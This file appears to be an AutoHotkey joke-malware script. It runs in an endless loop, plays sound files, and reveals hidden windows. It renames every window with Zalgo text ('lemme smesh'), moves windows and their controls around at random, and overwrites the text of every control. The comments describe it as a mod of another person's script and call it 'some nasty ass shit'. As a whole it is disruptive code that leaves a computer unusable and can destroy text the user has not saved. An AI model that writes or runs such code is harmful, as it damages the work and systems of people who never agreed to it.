#Persistent
; Direct mod of NO_BOOT_DEVICE's Welcomer script, some nasty ass shit
; No waiting time as it'll be handled by another script, and also it runs on infinite loop.
; Sorry for shit coding mate, I just couldn't get shit to work unless I spawned multiple instances of stuff
; Love you all, - Goldstar
SetBatchLines -1
loop 
{
SoundPlay, smash.wav, 1
	i := Ceil(0.01*%A_Index%)
	if (%A_Index% > 50) { 
		DetectHiddenWindows, On
	}
	winget, winlist, list
	loop, %winlist%
	{
		
		wid := winlist%A_Index%
		WinShow, ahk_id %wid%
		WinGet, conlist, ControlList, ahk_id %wid%	
		WinSetTitle, ahk_id %wid%,, l̿̅ͨ̒̍͛ͥ̊̂͐͋ͬͭͦ͏̷̷͕͇̮̬̟̮͍͙͉̣̳̙͇͕͚͍̺ȩ͔͉͎̖͖͓̙̞̱̝ͥ͂ͩ̆̎̿͛͒͛̐ͫͦ̂́̚m̸̴̤̰͍͇̩̤̥͆̿̂̽̌ͮ̓͒̏̉̽̽ͮ̊͜͢ͅm̵̝̮̳̫̹̜̅́̋̕͞͡e̵̸̸̠̙̯̗ͣ̉̏̒̑̀̔̏ͣ̂̋̍̓́ ̴̔̾ͥ̑ͧ͛ͮ̉̒̏̒̍͊̋̏͘͟҉̵̣̬̞̟͉͎̜̹͉̝̜̫̹s̸͍̖͈̫̲͍͈̦̟͇̎̀̇̈́ͮ͂ͣ̉ͨ͛̀̓͝m̸̎ͩ͒̚͝͏̶̧̣̥̞̣͇͈̭͎͉̼ȩ̢̬̟̖̫͎̦̭͕͙̥̙̝̙̃̔ͭͮ͛̅̎͝ͅs̷̶̨̬̤̯̝̺̦ͮ̽ͮͨ̐̈̊ͤ͢͜ḩ͑͛ͯ̾
		WinGetPos, wX, wY,,, ahk_id %wid%
		Random, rX, -100, 100
		Random, rY, -100, 100
		WinMove, ahk_id %wid%,, wX+rX, wY+rY
		Loop, Parse, conlist, `n, `r 
			{	
				ControlSetText, %A_LoopField%, l̴̛͜͝͞e̢̡͏m̨͡m̡̕è ̧́s̀͏m̷̵̛͘͡á̀̀s̵̵̢h̷̢̢, ahk_id %wid%
				ControlGetPos, cX, cY, cW, cH, %A_LoopField%, ahk_id %wid%
				Random, rX, -40, 40
				Random, rY, -40, 40
				ControlMove, %A_LoopField%, cX+rX, cY+rY,,, ahk_id %wid%	
			}
		
	}
	SoundPlay, boom.wav, 1
}